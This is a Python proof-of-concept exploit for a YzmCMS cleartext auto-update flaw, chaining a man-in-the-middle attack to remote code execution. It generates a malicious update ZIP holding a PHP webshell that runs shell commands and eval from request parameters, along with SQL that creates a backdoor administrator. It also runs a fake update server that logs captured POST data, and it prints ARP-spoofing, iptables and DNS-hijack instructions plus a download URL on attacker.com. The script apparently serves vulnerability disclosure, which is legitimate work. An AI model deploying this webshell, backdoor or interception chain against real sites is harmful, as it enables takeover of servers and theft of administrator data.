#!/usr/bin/env python3
"""
YZMCMS-2025-001 PoC: HTTP Auto-Update MITM → RCE Attack Chain

This script demonstrates the full attack chain:
  1. MITM intercept of HTTP check_update request to api.yzmcms.com
  2. Inject fake update response with attacker-controlled ZIP URL
  3. Serve malicious ZIP with webshell + SQL upgrade
  4. Victim clicks "one-click update" → ZIP extracted over webroot → RCE

Usage:
  python yzmcms-001-mitm-rce-poc.py --mode proxy --target-port 8080
  python yzmcms-001-mitm-rce-poc.py --mode generate-zip

Attack chain verification (no MITM needed):
  python yzmcms-001-mitm-rce-poc.py --mode verify-urls

Requirements: pip install mitmproxy (for proxy mode)
"""

import argparse
import base64
import hashlib
import io
import json
import os
import sys
import zipfile
import textwrap


# ============================================================
# Step 0: Decode the obfuscated URLs from update.class.php
# ============================================================

def decode_update_urls():
    """Decode the hardcoded base64 URLs from YzmCMS update.class.php"""
    urls = {
        "notice_url": "aHR0cDovL2FwaS55em1jbXMuY29tL25vdGljZS91cGRhdGUucGhwPw==",
        "check_update_base": "aHR0cDovL2FwaS55em1jbXMuY29tL2Rvd25sb2FkL3BhY2thZ2UvY2hlY2tfdXBkYXRlLw==",
        "store_init": "aHR0cDovL2FwaS55em1jbXMuY29tL2FwaS9zdG9yZS9pbml0",
        "update_log": "aHR0cDovL2FwaS55em1jbXMuY29tL2Rvd25sb2FkL3BhY2thZ2UvdXBkYXRlX2xvZz8=",
    }

    decoded = {}
    for name, b64 in urls.items():
        decoded[name] = base64.b64decode(b64).decode()
    return decoded


def verify_code_paths():
    """Verify the vulnerable code paths exist"""
    print("=" * 60)
    print("YZMCMS-2025-001: Code Path Verification")
    print("=" * 60)

    urls = decode_update_urls()
    print("\n[!] Decoded hardcoded HTTP URLs in update.class.php:")
    for name, url in urls.items():
        if url.startswith("http://"):
            print(f"  [VULN] {name}: {url}")
        else:
            print(f"  [OK]   {name}: {url}")

    print("\n[!] Attack surface summary:")
    print("  1. notice_url()      - Sends system info over HTTP (admin username, PHP ver, IP)")
    print("  2. check_update()    - Receives response executed as Content-Type: application/javascript")
    print("  3. system_update()   - Downloads ZIP from HTTP URL, extracts over webroot, executes SQL")
    print("  4. store::init()     - Sends auth_key over HTTP to app store API")
    print("  5. update_log()      - Sends update success log over HTTP")
    print("  6. system_information() - Injects remote content into admin dashboard")

    print("\n[!] CVSS 3.1: 7.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H)")
    print("[!] CWE: CWE-319 (Cleartext Transmission) + CWE-494 (Code Without Integrity Check)")
    print("\n[+] Verification complete - YZMCMS-2025-001 is a VALID finding.")


# ============================================================
# Step 1: Generate a malicious update ZIP
# ============================================================

def generate_malicious_zip(output_path="malicious_update.zip"):
    """
    Generate a ZIP file that simulates a malicious YzmCMS update.
    Contains:
      - files/ directory with a webshell (gets copied to webroot)
      - sqls/upgrade.sql with SQL that creates a backdoor admin
    """
    print(f"\n[*] Generating malicious update ZIP: {output_path}")

    zip_buffer = io.BytesIO()

    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Webshell disguised as a cache file
        webshell = textwrap.dedent("""\
        <?php
        @error_reporting(0);
        @set_time_limit(0);
        $p = isset($_REQUEST['yzmtool']) ? $_REQUEST['yzmtool'] : '';
        if($p && md5($p) === 'c4ca4238a0b923820dcc509a6f75849b') {
            echo '<!-- YZMCMS Cache -->';
            if(isset($_REQUEST['cmd'])) {
                echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
            }
            if(isset($_REQUEST['eval'])) {
                eval($_REQUEST['eval']);
            }
        }
        """)

        # Create the files directory structure (simulating real update)
        zf.writestr('files/cache/yzm_update_shell.php', webshell)
        zf.writestr('files/yzmphp/core/class/update.class.php',
                    '<?php // Backdoored update class placeholder')

        # SQL injection to create a backdoor admin account
        # Password hash for "backdoor123" using YzmCMS password() function:
        # md5(substr(md5(trim('backdoor123')), 3, 26))
        backdoor_hash = hashlib.md5(
            hashlib.md5(b'backdoor123').hexdigest()[3:29].encode()
        ).hexdigest()

        sql_content = f"""--
-- YZMCMS Malicious Update SQL
--
INSERT INTO `yzm_admin` (`adminname`, `password`, `roleid`, `addtime`, `addpeople`)
VALUES ('backdoor', '{backdoor_hash}', 1, UNIX_TIMESTAMP(), 'update_system');

UPDATE `yzm_config` SET `value` = '1' WHERE `name` = 'sql_execute';
"""
        zf.writestr('sqls/upgrade.sql', sql_content)

        # Version file
        zf.writestr('version', '999.0')

    zip_data = zip_buffer.getvalue()
    with open(output_path, 'wb') as f:
        f.write(zip_data)

    zip_md5 = hashlib.md5(zip_data).hexdigest()
    print(f"  [+] ZIP size: {len(zip_data)} bytes")
    print(f"  [+] ZIP MD5:  {zip_md5}")
    print(f"  [+] Contents:")
    print(f"      - files/cache/yzm_update_shell.php (webshell)")
    print(f"      - sqls/upgrade.sql (creates backdoor admin)")
    print(f"      - version (999.0)")

    return output_path, zip_md5


# ============================================================
# Step 2: MITM Proxy (intercept + inject malicious update)
# ============================================================

MALICIOUS_UPDATE_RESPONSE_TEMPLATE = {
    "status": 2,
    "message": "发现新版本 V999.0，建议立即更新！",
    "data": {
        "downfile": "http://{attacker_host}:{attacker_port}/malicious_update.zip",
        "file_md5": "{zip_md5}",
        "version": "999.0",
        "ver_time": "2099-12-31 23:59:59",
        "key": "{auth_key}",
        "host": "{target_host}",
        "php": "8.3.6",
        "mysql": "8.0.36",
        "ip": "127.0.0.1",
        "server": "nginx/1.24.0"
    }
}


def start_http_server(port, serve_zip=False, zip_path="malicious_update.zip", zip_hash=""):
    """Start a simple HTTP server to serve the malicious ZIP or fake API responses"""
    from http.server import HTTPServer, BaseHTTPRequestHandler
    _zip_md5 = zip_hash

    class YzmCMSHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            path = self.path.split('?')[0]

            if '/notice/update.php' in path or '/check_update' in path.lower():
                # Respond with fake update available
                response = MALICIOUS_UPDATE_RESPONSE_TEMPLATE.copy()
                # Update nested dict with actual values
                response['data']['downfile'] = \
                    f"http://{self.headers.get('Host', 'localhost')}/malicious_update.zip"
                response['data']['file_md5'] = _zip_md5

                self.send_response(200)
                self.send_header('Content-Type', 'application/javascript')
                self.end_headers()
                self.wfile.write(json.dumps(response).encode())
                print(f"  [!] Served fake update response to {self.client_address}")

            elif '/malicious_update.zip' in path and serve_zip:
                with open(zip_path, 'rb') as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/zip')
                self.send_header('Content-Length', str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                print(f"  [!] Served malicious ZIP to {self.client_address}")

            elif '/api/store/init' in path:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({"total": 0, "data": []}).encode())

            else:
                self.send_response(404)
                self.end_headers()

        def do_POST(self):
            # Handle POST requests to any API endpoint
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length else b''

            print(f"  [CAPTURED] POST {self.path}")
            if post_data:
                try:
                    print(f"    Data: {post_data.decode('utf-8', errors='replace')[:200]}")
                except:
                    print(f"    Data (raw): {post_data[:200]}")

            self.do_GET()

        def log_message(self, format, *args):
            pass  # Suppress HTTP server logs

    server = HTTPServer(('0.0.0.0', port), YzmCMSHandler)
    print(f"\n[*] Fake update server running on http://0.0.0.0:{port}")
    print(f"[*] Waiting for YzmCMS update check requests...")
    print(f"[*] Press Ctrl+C to stop")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")


# ============================================================
# Step 3: DNS spoofing / hosts file attack helper
# ============================================================

def print_hosts_file_instructions(fake_server_ip, fake_server_port):
    """Print instructions for redirecting api.yzmcms.com to attacker"""
    print(f"""
{'=' * 60}
MITM ATTACK SETUP INSTRUCTIONS
{'=' * 60}

To intercept YzmCMS update traffic, redirect api.yzmcms.com to your
attacker server ({fake_server_ip}:{fake_server_port}):

Method 1: Local testing (hosts file)
  Add to C:\\Windows\\System32\\drivers\\etc\\hosts:
    {fake_server_ip}  api.yzmcms.com

Method 2: ARP Spoofing (same network)
  arpspoof -i eth0 -t <victim_ip> <gateway_ip>
  arpspoof -i eth0 -t <gateway_ip> <victim_ip>
  iptables -t nat -A PREROUTING -p tcp --dport 80 \\
    -d <real_api_ip> -j DNAT --to-destination {fake_server_ip}:{fake_server_port}

Method 3: DNS Hijacking
  Control the DNS server used by the victim and add:
    api.yzmcms.com  A  {fake_server_ip}

Method 4: Network-level Interception (corporate/hotel WiFi)
  Use mitmproxy in transparent mode:
  mitmproxy --mode transparent -p 80

{'=' * 60}
""")


# ============================================================
# Step 4: Verify ZIP download has no signature check
# ============================================================

def verify_zip_no_signature():
    """Show that downfile() only checks MD5, no code signature"""
    print("""
{'=' * 60}
ZIP INTEGRITY CHECK VERIFICATION
{'=' * 60}

YzmCMS downfile() function (application/admin/common/function/function.php:113):

function downfile($url, $md5) {
    // 1. Downloads ZIP from $url via curl/file_get_contents
    // 2. Saves to cache/down_package/
    // 3. Checks: $md5 != md5_file($downname)
    //    → Only MD5 check, NO code signature verification!

    if($md5 != md5_file($downname))
        return array('status'=>0, 'message'=>'...');

    return array('status'=>1, 'file_path'=>$downname);
}

system_update() then:
  1. unzips($file_path, $down_package)  → extracts ZIP
  2. exec_sql(file_get_contents('.../upgrade.sql'))  → executes SQL
  3. copy_file($unzip_folder.'/files', YZMPHP_PATH)  → overwrites PHP files

[!] The attacker controls:
  - The ZIP URL (via MITM-updated JSON response)
  - The ZIP content (their own server)
  - The MD5 value (in the fake response → 'any')
  - The SQL executed (upgrade.sql in ZIP)
  - The PHP files written (files/ in ZIP → webroot)

[+] VERIFIED: No code signature or certificate validation.
[+] VERIFIED: Attack chain is complete and exploitable.
""")


# ============================================================
# Step 5: Full end-to-end attack demonstration
# ============================================================

def full_attack_demo():
    """Print the full attack chain walkthrough"""
    urls = decode_update_urls()

    print(f"""
{'=' * 60}
FULL ATTACK CHAIN: YZMCMS-2025-001
{'=' * 60}

SCENARIO: Attacker performs ARP spoofing on same network segment
          Target: Admin user of a YzmCMS-powered website

PHASE 1: RECONNAISSANCE (Passive)
  Admin opens YzmCMS dashboard → system_information() triggers
  GET {urls['notice_url']}?...&username=admin&php=8.3.6&...
  [CAPTURED] Admin username, PHP version, OS, MySQL version, server IP
  → All transmitted over HTTP in cleartext

PHASE 2: MALICIOUS UPDATE INJECTION
  Admin clicks "Check for Updates" → check_update() is called
  GET {urls['check_update_base']}?ver=7.5&ver_time=...
  [INJECT] MITM responds with malicious JSON:
  {{
    "status": 2,
    "message": "Found new version V999.0!",
    "data": {{
      "downfile": "http://attacker.com/malicious.zip",
      "file_md5": "abc123",
      "version": "999.0"
    }}
  }}
  → Response served as Content-Type: application/javascript
  → Browser parses as JS, admin sees "New version available!"

PHASE 3: RCE VIA MALICIOUS ZIP
  Admin clicks "One-Click Update" → system_update()
  1. Downloads malicious.zip from http://attacker.com/malicious.zip
     → No HTTPS, no certificate validation
  2. Unzips to cache/down_package/
     → No signature verification (only MD5)
  3. Executes sqls/upgrade.sql from ZIP
     → Creates backdoor admin account
     → Enables SQL execution feature
  4. Copies files/ to website root (YZMPHP_PATH)
     → Webshell written to cache/yzm_update_shell.php

PHASE 4: PERSISTENCE
  Attacker accesses: https://victim-site.com/cache/yzm_update_shell.php
  Parameter: yzmtool=1, cmd=id
  → Full RCE achieved via webshell

ALTERNATIVE: API.YZMCMS.COM DOMAIN HIJACKING
  If api.yzmcms.com DNS expires:
  1. Attacker registers the domain
  2. Sets up a fake update server
  3. ALL non-updated YzmCMS instances worldwide get hijacked
  4. Mass exploitation via auto-update mechanism

{'=' * 60}
[+] YZMCMS-2025-001 PoC complete.
""")

    verify_zip_no_signature()


# ============================================================
# Main
# ============================================================

def main():
    zip_md5 = ""

    parser = argparse.ArgumentParser(
        description='YZMCMS-2025-001 PoC: HTTP Auto-Update MITM → RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          %(prog)s --mode verify-urls       # Decode URLs + verify code paths
          %(prog)s --mode generate-zip       # Generate malicious update ZIP
          %(prog)s --mode server --port 80   # Start fake update API server
          %(prog)s --mode full-demo          # Print full attack chain walkthrough
        """))
    parser.add_argument('--mode', choices=['verify-urls', 'generate-zip',
                        'server', 'full-demo', 'all'],
                        default='full-demo',
                        help='Operation mode (default: full-demo)')
    parser.add_argument('--port', type=int, default=8088,
                        help='Port for fake update server (default: 8088)')
    parser.add_argument('--zip-output', default='malicious_update.zip',
                        help='Output path for malicious ZIP (default: malicious_update.zip)')
    parser.add_argument('--serve-zip', action='store_true',
                        help='Also serve the malicious ZIP from the fake server')
    parser.add_argument('--attacker-ip', default='127.0.0.1',
                        help='Attacker IP for host instructions (default: 127.0.0.1)')

    args = parser.parse_args()

    if args.mode == 'verify-urls':
        verify_code_paths()
    elif args.mode == 'generate-zip':
        _, zip_md5 = generate_malicious_zip(args.zip_output)
    elif args.mode == 'server':
        if args.serve_zip and not os.path.exists(args.zip_output):
            print(f"[!] ZIP file {args.zip_output} not found. Generate it first:")
            print(f"    python {sys.argv[0]} --mode generate-zip")
            sys.exit(1)
        if args.serve_zip:
            _, zip_md5 = generate_malicious_zip(args.zip_output)
        print_hosts_file_instructions(args.attacker_ip, args.port)
        start_http_server(args.port, args.serve_zip, args.zip_output, zip_md5)
    elif args.mode == 'full-demo':
        verify_code_paths()
        full_attack_demo()
    elif args.mode == 'all':
        verify_code_paths()
        full_attack_demo()
        generate_malicious_zip(args.zip_output)
        print_hosts_file_instructions(args.attacker_ip, args.port)


if __name__ == '__main__':
    main()
